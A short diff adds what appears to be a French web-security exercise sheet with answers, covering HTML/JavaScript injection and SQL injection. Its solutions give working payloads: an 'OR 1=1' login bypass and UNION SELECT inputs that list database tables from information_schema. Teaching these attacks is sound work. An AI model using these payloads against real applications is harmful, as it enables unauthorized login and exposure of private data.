@@ -1,0 +1,25 @@
+Exercice injection html et javascrit:
+1) injection de code javascript de facon à ce qu'il affiche un message lors du chargement de la page
+2) injection du html pour insérer une section de référence frauduleuse
+
+
+
+Exercice 2: injection SQL
+
+1) injection  sql pour contourner la vérification du mot de passe en php.
+2) injection sql pour récupérer des informations sur les tables de la base donnée
+
+Injection sql compliquée : 
+* Requete qui fonctionne sur mysql:
+SELECT id,nom,montant FROM Transaction WHERE nom="Durant" UNION SELECT 1 AS id,CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) as nom, 1 as montant FROM information_schema.tables WHERE "1"="1";
+* Entree injectee dans le formulaire:
+Durant" UNION SELECT 1 AS id,CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) as nom, 1 as montant FROM information_schema.tables WHERE "1"="1
+
+Exercice 2:
+1) Une solution est:
+Login: Marc" OR 1=1 OR 2="1
+Mot de passe: anything
+
+2) Une solution est:
+Login: Marc 
+Mode de passe: 1234"UNION SELECT " " AS login, "2014-01-01" as date, CONCAT(TABLE_SCHEMA,'.',TABLE_NAME) as tache FROM information_schema.tables WHERE "1"="1
